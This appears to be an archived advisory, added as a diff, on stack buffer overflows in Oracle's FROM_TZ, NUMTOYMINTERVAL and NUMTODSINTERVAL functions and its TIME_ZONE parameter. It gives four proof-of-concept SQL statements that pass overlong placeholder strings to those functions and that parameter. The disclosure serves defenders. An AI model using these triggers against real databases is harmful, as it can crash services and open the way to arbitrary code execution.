@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/9587/info
+
+Oracle database has been reported prone to multiple buffer overflow vulnerabilities when processing certain parameters and functions. Specifically the TIME_ZONE parameter, NUMTOYMINTERVAL, NUMTODSINTERVAL and FROM_TZ functions. Excessive data passed to any of the aforementioned parameters/statements may potentially overrun the bounds of a buffer in stack-based memory. This may result in the corruption of memory adjacent to the affected buffer, and ultimately may provide for arbitrary code execution.
+
+SELECT FROM_TZ(TIMESTAMP '2000-03-28 08:00:00','long string here') FROM DUAL;
+
+SELECT last_name, hire_date, salary, SUM(salary) OVER (ORDER BY hire_date RANGE NUMTOYMINTERVAL(1,'<long string here>') PRECEDING) AS t_sal FROM employees;
+
+SELECT empno, ename, hiredate, COUNT(*) OVER (PARTITION BY empno ORDER BY hiredate RANGE NUMTODSINTERVAL(100, '<long string here>') PRECEDING) AS t_count FROM emp;
+
+ALTER SESSION SET TIME_ZONE = '<long string here>'; SELECT CURRENT_TIMESTAMP, LOCALTIMESTAMP FROM DUAL;
